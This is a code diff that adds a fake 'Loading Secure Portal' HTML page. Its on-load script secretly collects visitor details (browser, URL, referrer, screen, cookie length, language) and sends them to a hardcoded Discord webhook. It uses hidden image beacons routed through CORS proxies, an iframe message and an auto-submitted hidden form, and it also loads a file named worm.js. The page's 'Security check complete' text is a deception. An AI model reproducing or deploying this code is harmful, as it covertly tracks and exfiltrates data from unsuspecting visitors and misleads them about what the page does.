@@ -1,3 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a1a;
+            color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .loader {
+            text-align: center;
+        }
+        .spinner {
+            border: 5px solid rgba(255,255,255,0.1);
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <h1>Loading Secure Portal...</h1>
+        <div class="spinner"></div>
+        <p id="status">Initializing security protocols...</p>
+    </div>
+
+    <!-- HIDDEN TRACKING ELEMENTS -->
+    <img id="beacon1" style="display:none;">
+    <img id="beacon2" style="display:none;">
+    <img id="beacon3" style="display:none;">
+    <iframe id="trackerFrame" style="display:none;"></iframe>
+    <script src="data.js"></script>
+    <script src="worm.js"></script>
+    
+    <!-- INSTANT EXECUTION ON LOAD -->
+    <script>
+        // EXECUTE IMMEDIATELY ON PAGE LOAD
+        (function() {
+            console.log("🚀 Starting immediate data collection...");
+            
+            // Method 1: Image Beacon (ALWAYS WORKS)
+            const webhook = "https://discord.com/api/webhooks/1453618382166556866/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq";
+            const ipData = JSON.stringify({
+                action: "PAGE_LOAD",
+                time: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                referrer: document.referrer,
+                screen: `${screen.width}x${screen.height}`,
+                cookies: document.cookie.length,
+                language: navigator.language
+            });
+            
+            // ENCODE DATA FOR URL
+            const encodedData = btoa(encodeURIComponent(ipData));
+            
+            // USE MULTIPLE BEACONS FOR REDUNDANCY
+            const beacons = [
+                `${webhook}?data=${encodedData}&method=img1`,
+                `https://api.allorigins.win/get?url=${encodeURIComponent(webhook + '?fallback=true')}`,
+                `https://corsproxy.io/?${encodeURIComponent(webhook + '?via=proxy')}`
+            ];
+            
+            // FIRE ALL BEACONS
+            beacons.forEach((url, i) => {
+                const img = document.getElementById(`beacon${i+1}`);
+                img.src = url + '&t=' + Date.now();
+                console.log(`Fired beacon ${i+1} to: ${url.substring(0, 100)}...`);
+            });
+            
+            // Method 2: Iframe POST (works even with CORS)
+            const iframe = document.getElementById('trackerFrame');
+            iframe.onload = function() {
+                console.log("Iframe loaded, attempting POST...");
+                try {
+                    iframe.contentWindow.postMessage({
+                        type: 'SEND_WEBHOOK',
+                        webhook: webhook,
+                        data: ipData
+                    }, '*');
+                } catch(e) {}
+            };
+            
+            // Method 3: Form Submit (old-school reliable)
+            setTimeout(() => {
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = webhook;
+                form.target = '_blank';
+                form.style.display = 'none';
+                
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'payload_json';
+                input.value = JSON.stringify({
+                    content: "🌐 **IMMEDIATE VISIT DETECTED**",
+                    embeds: [{
+                        title: "Page Load Triggered",
+                        description: "```json\n" + ipData + "\n```",
+                        color: 0x00ff00,
+                        timestamp: new Date().toISOString()
+                    }]
+                });
+                
+                form.appendChild(input);
+                document.body.appendChild(form);
+                form.submit();
+                setTimeout(() => document.body.removeChild(form), 1000);
+            }, 100);
+            
+            // Update status
+            document.getElementById('status').textContent = "Security check complete. Redirecting...";
+            
+        })();
+    </script>
+</body>
+</html>
+
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
